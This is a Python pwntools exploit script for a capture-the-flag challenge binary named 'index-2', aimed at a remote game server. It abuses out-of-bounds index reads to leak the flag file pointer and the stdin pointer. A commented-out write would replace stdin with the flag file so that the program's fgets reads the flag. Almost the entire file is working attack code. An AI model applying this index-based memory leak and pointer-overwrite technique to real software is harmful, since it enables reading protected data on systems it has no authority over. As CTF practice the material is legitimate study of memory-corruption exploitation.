#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template index-2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'index-2')
libc = ELF('./libc.so.6')
context.terminal = ['wt.exe','wsl.exe']
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOT:
        return remote('play.scriptsorcerers.xyz',10012)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# RUNPATH:    b'.'
# Stripped:   No

p = start()

def read_data(index):
    p.sendline(b'2')
    p.sendlineafter(b'Index: ', str(index).encode())
    p.recvuntil(b'Data: ')
    leaked_data = p.recv(6)
    return leaked_data

def store_data(index, data):
    p.sendline(b'1')
    p.sendlineafter(b'Index: ', str(index).encode())
    p.sendlineafter(b'Data: ', data)

# membuka flag dalam variabel f
p.sendline(b'1337')
# membaca alamat pointer ke f
leak_f = u64(read_data(8).ljust(8,b'\x00'))
leak_stdin = u64(read_data(-6).ljust(8,b'\x00'))
print("Alamat pointer f (flag.txt):", hex(leak_f))
print("Alamat pointer stdin:", hex(leak_stdin))

# Exploit
# jadi kita ingin mengubah fgets(s, 100, stdin); <-- ada di fungsi main
# menjadi seperti ini fgets(s, 100, f); <-- ini akan membuka f yg isinya flag
# -6 ini adalah stdin yg kita write menjadi f
# store_data(-6,p64(leak_f))

p.interactive()


